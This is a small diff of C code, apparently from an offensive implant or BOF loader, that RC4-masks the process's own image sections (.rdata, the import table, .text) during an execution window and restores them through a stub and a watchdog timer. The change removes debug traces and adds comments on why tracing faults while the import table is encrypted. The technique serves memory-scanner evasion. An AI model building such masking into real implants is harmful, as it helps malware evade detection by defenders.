@@ -775,14 +775,14 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		return FALSE;
 	}
 	BW_TRACE("blocks flipped RW");
+	/* NO TRACE BEYOND THIS POINT: once .rdata is masked, every IAT slot is
+	 * ciphertext - the next fprintf (or a VEH calling WriteFile) faults on
+	 * its own import table. The window is dark until the exit stub returns. */
 	for (i = 0; i < nblocks; i++) {
-		if (i != text_idx) {
-			BW_TRACE2("masking block", blocks[i].ptr, blocks[i].len, i);
+		if (i != text_idx)
 			bw_rc4(fn, blocks[i].ptr, blocks[i].len, ctx->key2, key, (unsigned int)i);
-		}
 	}
 	ctx->phase = 2; /* all but .text masked */
-	BW_TRACE("masked, entering stub");
 
 	/* from here to the exit stub this thread may only touch: stack, ctx
 	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
@@ -790,8 +790,8 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	 * returns into THIS frame. */
 	enter = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
 	enter();
-	ctx->phase = 4; /* exit stub returned to this frame */
-	BW_TRACE("stub returned, resting");
+	ctx->phase = 4; /* exit stub returned to this frame - no trace here,
+	                 * .rdata (and the IAT) is still ciphertext */
 
 	/* .text is plaintext+RX again (exit_stub, or the watchdog won and
 	 * exit_stub saw state==CLOSED). The image except .text is still
@@ -805,7 +805,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	}
 	bw_blocks_restore(blocks, nblocks, text_idx);
 	DeleteTimerQueueTimer(NULL, timer, NULL);
-	BW_TRACE("window complete");
+	BW_TRACE("window complete"); /* IAT alive again: everything unmasked */
 
 	memset(key, 0, sizeof(key));
 	memset(ctx->key, 0, 16);
